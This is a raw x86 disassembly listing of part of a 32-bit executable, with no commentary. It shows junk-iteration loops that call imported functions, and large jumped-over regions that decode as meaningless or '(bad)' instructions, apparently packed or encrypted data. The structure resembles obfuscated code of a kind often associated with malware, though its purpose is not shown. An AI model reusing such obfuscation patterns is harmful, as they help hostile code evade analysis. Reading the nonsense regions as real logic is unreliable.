  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x1560,0x43
  40a1b4:	ins    DWORD PTR es:[edi],dx
  40a1b5:	stos   BYTE PTR es:[edi],al
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	data16 in al,dx
  40a1c0:	jno    0x40a1e3
  40a1c2:	arpl   WORD PTR [ecx-0x4],bp
  40a1c5:	mov    esi,0xb8c77a4a
  40a1ca:	push   0xffffffaa
  40a1cc:	push   esi
  40a1cd:	in     al,0x4a
  40a1cf:	scas   eax,DWORD PTR es:[edi]
  40a1d0:	dec    edx
  40a1d1:	xor    al,0x75
  40a1d3:	cwde   
  40a1d4:	(bad)  
  40a1d5:	mov    cl,0xa5
  40a1d7:	xor    ebx,DWORD PTR [edi]
  40a1d9:	inc    ebx
  40a1da:	ds loop 0x40a1dd
  40a1dd:	loope  0x40a229
  40a1df:	mov    ds:0xb069e306,eax
  40a1e4:	scas   eax,DWORD PTR es:[edi]
  40a1e5:	mov    eax,ds:0xc855472c
  40a1ea:	(bad)
  40a1ed:	dec    ecx
  40a1ee:	enter  0xfe2a,0x26
  40a1f2:	fiadd  WORD PTR [ecx]
  40a1f4:	xchg   edx,eax
  40a1f5:	pop    ds
  40a1f6:	lods   al,BYTE PTR ds:[esi]
  40a1f7:	mov    ebp,0xaacc07e1
  40a1fc:	xor    eax,0xcf9a803c
  40a201:	fisub  WORD PTR [edx+0x1]
  40a204:	or     BYTE PTR [edi-0x5a4db8a1],ah
  40a20a:	push   ecx
  40a20b:	int3   
  40a20c:	loope  0x40a1d4
  40a20e:	(bad)
  40a211:	pop    eax
  40a212:	outs   dx,DWORD PTR ds:[esi]
  40a213:	mov    dh,0x53
  40a215:	mov    ?,WORD PTR [edx*1-0x42a0065b]
  40a21c:	dec    esi
  40a21d:	sub    DWORD PTR [eax-0xadaa853],edx
  40a223:	loop   0x40a2a0
  40a225:	push   es
  40a226:	adc    BYTE PTR [esp+ebx*4-0x40],ah
  40a22a:	dec    esi
  40a22b:	aaa    
  40a22c:	jmp    0x9d70:0x8dd8e91b
  40a233:	imul   esi,DWORD PTR [eax],0x9a2a96bc
  40a239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a23a:	ja     0x40a23a
  40a23c:	sbb    ecx,DWORD PTR [esi+0x125d770b]
  40a242:	inc    eax
  40a243:	jle    0x40a2a2
  40a245:	jge    0x40a212
  40a247:	xchg   esp,eax
  40a248:	mov    bh,0x78
  40a24a:	adc    al,0xbe
  40a24c:	out    0x62,eax
  40a24e:	inc    edi
  40a24f:	pop    esi
  40a250:	ret    
  40a251:	stos   DWORD PTR es:[edi],eax
  40a252:	mov    esp,0xf68c90c1
  40a257:	jl     0x40a207
  40a259:	imul   edi,ebp,0xb5aa7655
  40a25f:	shl    BYTE PTR [eax-0x79],1
  40a262:	aas    
  40a263:	dec    esi
  40a264:	inc    ecx
  40a265:	pop    eax
  40a266:	loop   0x40a2cb
  40a268:	jmp    0xc3a2:0x8e8b2eb0
  40a26f:	inc    edi
  40a270:	xchg   ebp,eax
  40a271:	add    esi,DWORD PTR [esi+edx*8+0x780ef71c]
  40a278:	fstp   TBYTE PTR [edi+esi*2]
  40a27b:	rcr    DWORD PTR [ebx-0x1a],1
  40a27e:	je     0x40a258
  40a280:	inc    edi
  40a281:	pop    esi
  40a282:	mov    ebx,0xa6755b71
  40a287:	bswap  ebp
  40a289:	std    
  40a28a:	xchg   edi,eax
  40a28b:	test   al,0x67
  40a28d:	ins    BYTE PTR es:[edi],dx
  40a28e:	cmp    bl,ah
  40a290:	int    0xe0
  40a292:	sbb    ebx,DWORD PTR [ebx+ecx*4-0x1c]
  40a296:	repz mov edi,0xb775d292
  40a29c:	jp     0x40a2d6
  40a29e:	fbstp  TBYTE PTR [eax+0xf]
  40a2a1:	mov    ecx,0x4836a1c0
  40a2a6:	and    eax,0x7cb58598
  40a2ab:	popa   
  40a2ac:	and    ebp,DWORD PTR [edi]
  40a2ae:	adc    eax,DWORD PTR [eax+0x3c29714f]
  40a2b4:	push   es
  40a2b5:	xchg   BYTE PTR [ebx],ah
  40a2b7:	jbe    0x40a326
  40a2b9:	mov    al,0xb4
  40a2bb:	jge    0x40a338
  40a2bd:	jge    0x40a32a
  40a2bf:	ret    0x8fae
  40a2c2:	pop    edx
  40a2c3:	push   0x3a899c8a
  40a2c8:	and    edi,DWORD PTR [ecx+0x6828a44a]
  40a2ce:	inc    ebx
  40a2cf:	inc    edi
  40a2d0:	sbb    dh,BYTE PTR [edx-0x1e311aa0]
  40a2d6:	push   0xffffffc3
  40a2d8:	rol    DWORD PTR [ecx+0x35],cl
  40a2db:	in     al,dx
  40a2dc:	mov    bl,0x81
  40a2de:	adc    DWORD PTR [ecx+0x76],edi
  40a2e1:	or     al,BYTE PTR [eax+0x7d]
  40a2e4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40a2e6:	pop    eax
  40a2e7:	sbb    BYTE PTR [edx+0x59],bh
  40a2ea:	cmp    dh,BYTE PTR [esi+0x47551043]
  40a2f0:	and    DWORD PTR [ebx],0xded047f8
  40a2f6:	mov    edx,0xac3a8df
  40a2fb:	in     al,0x77
  40a2fd:	jp     0x40a307
  40a2ff:	(bad)
  40a303:	cmp    ecx,esi
  40a305:	mov    eax,DWORD PTR [ebx-0x1fdfe155]
  40a30b:	add    bh,ch
  40a30d:	ins    DWORD PTR es:[edi],dx
  40a30e:	shl    BYTE PTR [ecx+0x22],1
  40a311:	and    ch,BYTE PTR [edx+0x6b]
  40a314:	cli    
  40a315:	push   0x66
  40a317:	repz xlat BYTE PTR ds:[ebx]
  40a319:	fsub   QWORD PTR [eax+edx*1-0x4993c738]
  40a320:	push   es
  40a321:	imul   ecx,DWORD PTR [eax],0x7e
  40a324:	xchg   esp,eax
  40a325:	or     cl,ch
  40a327:	xchg   ebp,eax
  40a328:	repnz or DWORD PTR [edx+0x73],ebx
  40a32c:	inc    edx
  40a32d:	shl    DWORD PTR gs:[edi],1
  40a330:	or     DWORD PTR [esi+0x24],eax
  40a333:	in     eax,dx
  40a334:	pop    ebx
  40a335:	dec    edx
  40a336:	adc    eax,0x39e4a399
  40a33b:	(bad)  
  40a33c:	shr    DWORD PTR [edi],1
  40a33e:	mov    DWORD PTR [edi],esi
  40a340:	xor    BYTE PTR [edx+edi*8+0x53127126],0x2b
  40a348:	loop   0x40a358
  40a34a:	into   
  40a34b:	pop    edi
  40a34c:	xor    bl,BYTE PTR [edi-0x482121ce]
  40a352:	add    al,0x9
  40a354:	jne    0x40a2fb
  40a356:	hlt    
  40a357:	push   edx
  40a358:	loop   0x40a391
  40a35a:	outs   dx,DWORD PTR ds:[esi]
  40a35b:	das    
  40a35c:	jne    0x40a325
  40a35e:	in     eax,0x88
  40a360:	xor    DWORD PTR [esi-0x4502bafa],edx
  40a366:	dec    esi
  40a367:	lods   al,BYTE PTR ds:[esi]
  40a368:	imul   esp,DWORD PTR [esi],0x59
  40a36b:	out    dx,al
  40a36c:	aaa    
  40a36d:	outs   dx,BYTE PTR ds:[esi]
  40a36e:	and    esi,ecx
  40a370:	(bad)  
  40a371:	in     eax,dx
  40a372:	jnp    0x40a3ee
  40a374:	sbb    DWORD PTR [ecx],edx
  40a376:	(bad)  
  40a377:	clc    
  40a378:	inc    ebp
  40a379:	xchg   ch,bh
  40a37b:	dec    esi
  40a37c:	xor    DWORD PTR [ebx-0x40],esi
  40a37f:	cmp    BYTE PTR gs:[edi+0x64253814],dh
  40a386:	mov    cl,0x7f
  40a388:	js     0x40a3c5
  40a38a:	cmp    ebx,ebp
  40a38c:	loopne 0x40a387
  40a38e:	mov    ah,BYTE PTR [ebp-0x6e]
  40a391:	scas   al,BYTE PTR es:[edi]
  40a392:	fcmovnbe st,st(3)
  40a394:	push   cs
  40a395:	aaa    
  40a396:	shl    BYTE PTR [ebx+0x346f6679],0x3c
  40a39d:	pop    ecx
  40a39e:	and    al,0x99
  40a3a0:	mov    ds:0x87c8d007,al
  40a3a5:	je     0x40a425
  40a3a7:	scas   al,BYTE PTR es:[edi]
  40a3a8:	dec    esp
  40a3a9:	mov    dl,0xad
  40a3ab:	ja     0x40a351
  40a3ad:	dec    edi
  40a3ae:	es mov esp,0x6de2106f
  40a3b4:	shl    DWORD PTR [eax+0x742fc251],0x4c
  40a3bb:	add    eax,0x996cfa7a
  40a3c0:	popf   
  40a3c1:	push   esi
  40a3c2:	xchg   esp,eax
  40a3c3:	fst    QWORD PTR [ecx+0x529decbe]
  40a3c9:	sbb    esi,ecx
  40a3cb:	push   ecx
  40a3cc:	add    eax,0x1fd791c4
  40a3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d2:	test   al,0x5e
  40a3d4:	and    edx,DWORD PTR [edx]
  40a3d6:	xchg   edi,eax
  40a3d7:	sbb    ebp,edx
  40a3d9:	dec    edx
  40a3da:	or     dl,BYTE PTR [edx]
  40a3dc:	jb     0x40a3fb
  40a3de:	enter  0x5e13,0x85
  40a3e2:	sub    edx,eax
  40a3e4:	imul   edi,DWORD PTR [ebx],0xffffffa3
  40a3e7:	(bad)  
  40a3e8:	test   BYTE PTR [edi+0x27f138ff],al
  40a3ee:	mov    edi,0x7bfe565a
  40a3f3:	push   esp
  40a3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3f5:	sub    ebp,DWORD PTR [eax-0x17966918]
  40a3fb:	call   0x7e890fcf
  40a400:	inc    ebx
  40a401:	adc    al,0xac
  40a403:	adc    DWORD PTR [ebp-0x456326be],esi
  40a409:	mov    bl,0xaf
  40a40b:	jbe    0x40a3e4
  40a40d:	nop
  40a40e:	and    BYTE PTR [edx+0x4a],ah
  40a411:	mul    ch
  40a413:	adc    al,BYTE PTR [esi-0x33]
  40a416:	jb     0x40a432
  40a418:	ja     0x40a43a
  40a41a:	inc    ebp
  40a41b:	mov    ebp,0x791d6129
  40a420:	jae    0x40a404
  40a422:	arpl   WORD PTR [ebx],sp
  40a424:	fistp  WORD PTR [esi]
  40a426:	mov    WORD PTR [esi],?
  40a428:	fld    DWORD PTR [eax]
  40a42a:	add    bh,al
  40a42c:	add    DWORD PTR [ebx+0x65],ebx
  40a42f:	in     al,dx
  40a430:	adc    al,0xfd
  40a432:	inc    eax
  40a433:	lock ss stos BYTE PTR es:[edi],al
  40a436:	rcr    BYTE PTR [edi+0x7993ac78],cl
  40a43c:	pmaxsw mm6,mm1
  40a43f:	retf   0xa19d
  40a442:	lock and ch,ch
  40a445:	imul   edi,DWORD PTR [ebp-0x25],0x4345aa2c
  40a44c:	clc    
  40a44d:	sar    BYTE PTR [esi-0x6618466e],cl
  40a453:	in     eax,0x9
  40a455:	mov    ch,0x76
  40a457:	sub    ch,BYTE PTR [esi]
  40a459:	stos   BYTE PTR es:[edi],al
  40a45a:	adc    esi,edi
  40a45c:	sub    dl,BYTE PTR [ebx+0x34]
  40a45f:	adc    al,0x9c
  40a461:	repz jl 0x40a49e
  40a464:	fimul  DWORD PTR [edx+eiz*4+0x7d642db4]
  40a46b:	cmp    DWORD PTR [eax+0x56],edx
  40a46e:	jb     0x40a4b6
  40a470:	pop    ebx
  40a471:	ja     0x40a46f
  40a473:	scas   eax,DWORD PTR es:[edi]
  40a474:	mov    edi,0xd0496ddc
  40a479:	jmp    0x4c314fe6
  40a47e:	adc    dl,bh
  40a480:	push   DWORD PTR [ebx-0x79]
  40a483:	sahf   
  40a484:	pop    esp
  40a485:	loop   0x40a440
  40a487:	jno    0x40a4be
  40a489:	inc    esi
  40a48a:	(bad)  
  40a48b:	in     al,0x52
  40a48d:	inc    edi
  40a48e:	xor    eax,0xe60be77e
  40a493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a494:	sub    al,0xf8
  40a496:	faddp  st(2),st
  40a498:	xor    edx,DWORD PTR ds:0x1adc6bd8
  40a49e:	dec    ebx
  40a49f:	jns    0x40a51d
  40a4a1:	add    ch,BYTE PTR [esp+esi*8]
  40a4a4:	sbb    eax,0xbae2f323
  40a4a9:	add    ebx,DWORD PTR [eax+edi*8-0x637ef05a]
  40a4b0:	nop
  40a4b1:	ret    
  40a4b2:	pusha  
  40a4b3:	xor    DWORD PTR [eax],esi
  40a4b5:	call   0x458d:0x61ad1852
  40a4bc:	fadd   QWORD PTR [ecx+0x42a7cd25]
  40a4c2:	add    ch,dh
  40a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	mov    DWORD PTR [eax+0x30d00042],ebp
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x6d],dh
  40a61b:	xor    BYTE PTR [ebx+0x58],ah
  40a61e:	fdivp  st(6),st
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	or     al,0x16
  40a628:	mov    eax,0xb6babe22
  40a62d:	in     al,dx
  40a62e:	sub    DWORD PTR [ebx+0x4461648d],edi
  40a634:	out    dx,al
  40a635:	daa    
  40a636:	mov    ah,0x9e
  40a638:	or     eax,0xd3e4d80a
  40a63d:	adc    al,0x55
  40a63f:	retf   0x7d2
  40a642:	inc    esi
  40a643:	jg     0x40a660
  40a645:	pop    edi
  40a646:	xchg   ebp,eax
  40a647:	(bad)  
  40a648:	pop    eax
  40a649:	xchg   DWORD PTR [edx],esi
  40a64b:	mov    esi,0xc9bdaf3
  40a650:	xchg   edi,eax
  40a651:	ret    
  40a652:	sahf   
  40a653:	jmp    0xb93e:0xfb94d393
  40a65a:	inc    BYTE PTR [ecx+ecx*2-0x152eb669]
  40a661:	xchg   ecx,eax
  40a662:	dec    edi
  40a663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a664:	loope  0x40a65e
  40a666:	push   ebp
  40a667:	fsubr  st(6),st
  40a669:	jmp    0x40a63e
  40a66b:	in     eax,0x91
  40a66d:	sbb    al,0x44
  40a66f:	inc    ebp
  40a670:	xor    DWORD PTR [edi+0x2accba37],edi
  40a676:	out    0x97,al
  40a678:	push   ss
  40a679:	jae    0x40a631
  40a67b:	je     0x40a667
  40a67d:	sub    esi,DWORD PTR [edi+0x71]
  40a680:	inc    esi
  40a681:	sub    al,0x35
  40a683:	dec    eax
  40a684:	ret    0xa656
  40a687:	cmp    al,0x4c
  40a689:	adc    DWORD PTR [edx-0x6ae074cd],eax
  40a68f:	pop    ebx
  40a690:	jg     0x40a696
  40a692:	mov    ecx,0x81955078
  40a697:	loop   0x40a627
  40a699:	lods   al,BYTE PTR ds:[esi]
  40a69a:	push   0x50
  40a69c:	inc    edi
  40a69d:	and    DWORD PTR [edx-0x22570ff3],esi
  40a6a3:	pop    ss
  40a6a4:	lods   eax,DWORD PTR ds:[esi]
  40a6a5:	mov    al,ds:0xef52d7a6
  40a6aa:	popf   
  40a6ab:	push   esp
  40a6ac:	adc    ebp,DWORD PTR [ebp+0x40]
  40a6af:	neg    BYTE PTR [esi+ecx*2-0x48]
  40a6b3:	jmp    0x40a70a
  40a6b5:	pop    ebx
  40a6b6:	mov    WORD PTR [esi],ds
  40a6b8:	sbb    cl,0xc8
  40a6bb:	std    
  40a6bc:	sbb    DWORD PTR [ebp+0x4ba09461],ebx
  40a6c2:	jl     0x40a73d
  40a6c4:	push   edi
  40a6c5:	stos   DWORD PTR es:[edi],eax
  40a6c6:	lds    ebp,FWORD PTR [ebx+0x14]
  40a6c9:	jno    0x40a69e
  40a6cb:	cwde   
  40a6cc:	mov    eax,ds:0xcb9e42af
  40a6d1:	cmp    eax,0x3d417b95
  40a6d6:	jg     0x40a6ba
  40a6d8:	xchg   ecx,eax
  40a6d9:	push   esp
  40a6da:	bound  ebx,QWORD PTR [eax+0x66]
  40a6dd:	dec    esi
  40a6de:	mov    edi,DWORD PTR [eax+0x34e8beef]
  40a6e4:	test   edi,edx
  40a6e6:	adc    edi,eax
  40a6e8:	push   ebp
  40a6e9:	or     al,0xbc
  40a6eb:	jne    0x40a762
  40a6ed:	adc    al,0x94
  40a6ef:	xchg   BYTE PTR [ebp-0x4c],bh
  40a6f2:	sbb    dh,0x6a
  40a6f5:	and    al,0x34
  40a6f7:	ret    
  40a6f8:	lods   eax,DWORD PTR ds:[esi]
  40a6f9:	scas   al,BYTE PTR es:[edi]
  40a6fa:	cmc    
  40a6fb:	loopne 0x40a6a7
  40a6fd:	xchg   esp,eax
  40a6fe:	daa    
  40a6ff:	jle    0x40a6be
  40a701:	out    0xbb,al
  40a703:	das    
  40a704:	mov    al,0x6
  40a707:	ja     0x40a71c
  40a709:	fnstenv [edi]
  40a70b:	add    eax,0x2c4ec725
  40a710:	jmp    0x72e720df
  40a715:	mov    bl,0xb
  40a717:	push   cs
  40a718:	pop    eax
  40a719:	xchg   edi,eax
  40a71a:	pop    ss
  40a71b:	jl     0xf95cd012
  40a721:	add    cl,BYTE PTR [esi]
  40a723:	shl    cl,cl
  40a725:	aad    0x7b
  40a727:	inc    esp
  40a728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a729:	push   0xffffff88
  40a72b:	push   0x6
  40a72d:	nop
  40a72e:	repnz call 0xa175:0xbbf19655
  40a736:	sbb    al,0x18
  40a738:	xchg   esi,eax
  40a739:	mov    esi,0xa8d8d8f8
  40a73e:	jmp    0x57d9:0x3ed39a3
  40a745:	cwde   
  40a746:	push   esp
  40a747:	cmp    eax,0xf70148cf
  40a74c:	ret    0xa276
  40a74f:	mov    DWORD PTR [eax-0x24],ebp
  40a752:	pop    es
  40a753:	idiv   DWORD PTR [ebx+eiz*4]
  40a756:	mov    esp,0xd77b8862
  40a75b:	or     ch,bh
  40a75d:	xchg   ebx,eax
  40a75e:	retf   0x882f
  40a761:	inc    eax
  40a762:	stos   DWORD PTR es:[edi],eax
  40a763:	(bad)  
  40a764:	mov    cl,0xca
  40a766:	aas    
  40a767:	or     bh,BYTE PTR [esi+0x97e00be]
  40a76d:	js     0x40a739
  40a76f:	mov    edi,0xf7b97a87
  40a774:	jo     0x40a7c0
  40a776:	push   ds
  40a777:	dec    eax
  40a778:	(bad)  [eax+0x1c]
  40a77b:	dec    eax
  40a77c:	std    
  40a77d:	xchg   esi,eax
  40a77e:	fnstenv [eax+0x5605dc9c]
  40a784:	xor    eax,0x29a05398
  40a789:	test   DWORD PTR [ebp+edi*4+0x2e7810c6],0x4c9c883c
  40a794:	and    ecx,ebx
  40a796:	mov    ebx,0x218a0f67
  40a79b:	ss in  eax,dx
  40a79d:	mov    ch,BYTE PTR ds:0xd1e58426
  40a7a3:	shl    DWORD PTR [edx+0x11206bef],0x0
  40a7aa:	daa    
  40a7ab:	mov    esp,0x637ca76d
  40a7b0:	test   BYTE PTR [ecx],cl
  40a7b2:	fstp   DWORD PTR [esi+0x3e]
  40a7b5:	scas   al,BYTE PTR es:[edi]
  40a7b6:	jg     0x40a825
  40a7b8:	ret    0x72a1
  40a7bb:	leave  
  40a7bc:	sbb    al,0x41
  40a7be:	hlt    
  40a7bf:	xchg   ecx,eax
  40a7c0:	sub    DWORD PTR [ecx+0x43e2ccba],edi
  40a7c6:	pop    eax
  40a7c7:	jmp    DWORD PTR ss:[eax]
  40a7ca:	and    eax,0xe242dc70
  40a7cf:	shl    DWORD PTR [esi],1
  40a7d1:	pusha  
  40a7d2:	cdq    
  40a7d3:	and    DWORD PTR [ecx],ecx
  40a7d5:	sub    al,0xa2
  40a7d7:	les    ebp,FWORD PTR [edx+eax*4+0x19]
  40a7db:	addr16 mov ch,0x46
  40a7de:	xor    dh,dl
  40a7e0:	xchg   esi,eax
  40a7e1:	retf   
  40a7e2:	inc    esp
  40a7e3:	out    0x84,al
  40a7e5:	arpl   WORD PTR [esi+0x4f],cx
  40a7e8:	mov    WORD PTR [ebx],ss
  40a7ea:	push   edx
  40a7eb:	ret    
  40a7ec:	aaa    
  40a7ed:	mov    ah,0x64
  40a7ef:	jge    0x40a7f6
  40a7f1:	lods   al,BYTE PTR ds:[esi]
  40a7f2:	adc    BYTE PTR [eax],ch
  40a7f4:	inc    ebp
  40a7f5:	xor    DWORD PTR [ecx],eax
  40a7f7:	cmc    
  40a7f8:	xor    edx,ebx
  40a7fa:	test   al,0x71
  40a7fc:	jns    0x40a783
  40a7fe:	cmp    edi,ebx
  40a800:	mov    esi,0x9916a5e
  40a805:	add    bl,BYTE PTR [ecx]
  40a807:	xor    dh,BYTE PTR [edi+0x40]
  40a80a:	fnstenv [esi+edi*4-0x7e]
  40a80e:	cld    
  40a80f:	mov    al,ds:0x69e5c562
  40a814:	jl     0x40a83f
  40a816:	out    dx,al
  40a817:	mov    edx,ebx
  40a819:	inc    esp
  40a81a:	mov    cl,0xfe
  40a81c:	pop    esi
  40a81d:	jg     0x40a7ef
  40a81f:	mov    eax,DWORD PTR [ebp-0x22d94e27]
  40a825:	xor    al,0x44
  40a827:	(bad)  
  40a828:	pop    esp
  40a829:	mov    ah,0xa9
  40a82b:	adc    ch,BYTE PTR gs:[ebx]
  40a82e:	or     al,0xb8
  40a830:	iret   
  40a831:	inc    edx
  40a832:	jle    0x40a7cc
  40a834:	popa   
  40a835:	sbb    BYTE PTR [eax+ecx*8+0x62b64202],0x8b
  40a83d:	inc    esp
  40a83e:	cmp    eax,0x4c61ab2
  40a843:	pop    ebx
  40a844:	mov    al,ds:0xc00b4f8b
  40a849:	add    al,0x42
  40a84b:	int    0x3b
  40a84d:	mov    ecx,DWORD PTR [ebp+0x14]
  40a850:	test   al,0x92
  40a852:	cmc    
  40a853:	shl    DWORD PTR [ebx],1
  40a855:	push   ss
  40a856:	out    0x91,eax
  40a858:	dec    esi
  40a859:	jo     0x40a812
  40a85b:	add    eax,0xe6185d3f
  40a860:	in     eax,dx
  40a861:	aad    0x7f
  40a863:	mov    edx,DWORD PTR [ecx+0x5e6accc6]
  40a869:	jecxz  0x40a7fe
  40a86b:	push   cs
  40a86c:	cdq    
  40a86d:	inc    ecx
  40a86e:	fucom  st(4)
  40a870:	daa    
  40a871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a872:	push   ds
  40a873:	stc    
  40a874:	popf   
  40a875:	dec    eax
  40a876:	cmp    al,0x6d
  40a878:	adc    dh,ah
  40a87a:	mov    DWORD PTR [eax+0x85bd0c0],0x90c04582
  40a884:	hlt    
  40a885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a886:	and    ch,dh
  40a888:	or     ch,dl
  40a88a:	or     esi,DWORD PTR [ebx+0x492f9ad2]
  40a890:	fcom   QWORD PTR [esi+0x27]
  40a893:	mov    edi,0x3104edaa
  40a898:	int3   
  40a899:	sub    esp,ecx
  40a89b:	dec    ecx
  40a89c:	addr16 cmp al,0xe8
  40a89f:	mov    ds:0xa1137be4,eax
  40a8a4:	and    ecx,edx
  40a8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a7:	sti    
  40a8a8:	xor    DWORD PTR [ebx+0x4f],eax
  40a8ab:	sbb    dl,BYTE PTR [edi+0x5b]
  40a8ae:	add    DWORD PTR [ebx],ebx
  40a8b0:	pop    edx
  40a8b1:	mov    ecx,0x76312d2f
  40a8b6:	or     ebp,ecx
  40a8b8:	std    
  40a8b9:	fisub  WORD PTR [edi+eiz*2+0x22]
  40a8bd:	mov    ds:0xbb52b566,al
  40a8c2:	sub    al,dl
  40a8c4:	test   BYTE PTR [ecx+ebx*8+0x63],ch
  40a8c8:	push   ecx
  40a8c9:	push   es
  40a8ca:	pop    ebx
  40a8cb:	add    DWORD PTR [edx-0x25],eax
  40a8ce:	xor    BYTE PTR [ebp+0x6a],ch
  40a8d1:	sbb    edx,edx
  40a8d3:	loope  0x40a88b
  40a8d5:	xchg   dh,cl
  40a8d7:	outs   dx,BYTE PTR ds:[esi]
  40a8d8:	adc    eax,0xa932ed7c
  40a8dd:	xor    ebp,DWORD PTR [eax]
  40a8df:	cmc    
  40a8e0:	imul   eax,DWORD PTR [eax-0x5cebd6ca],0x45
  40a8e7:	cmp    al,0x85
  40a8e9:	cmp    esp,ecx
  40a8eb:	pop    ecx
  40a8ec:	nop
  40a8ed:	push   ebp
  40a8ee:	retf   
  40a8ef:	subps  xmm5,XMMWORD PTR [ebx]
  40a8f2:	mov    bl,0xd
  40a8f4:	popf   
  40a8f5:	ret    0x89f4
  40a8f8:	sub    al,0x4a
  40a8fa:	loope  0x40a8c2
  40a8fc:	push   ds
  40a8fd:	rol    eax,1
  40a8ff:	cmp    al,0x36
  40a901:	adc    esi,DWORD PTR [edx]
  40a903:	shl    DWORD PTR [ecx-0x4],0x22
  40a907:	loope  0x40a959
  40a909:	push   edi
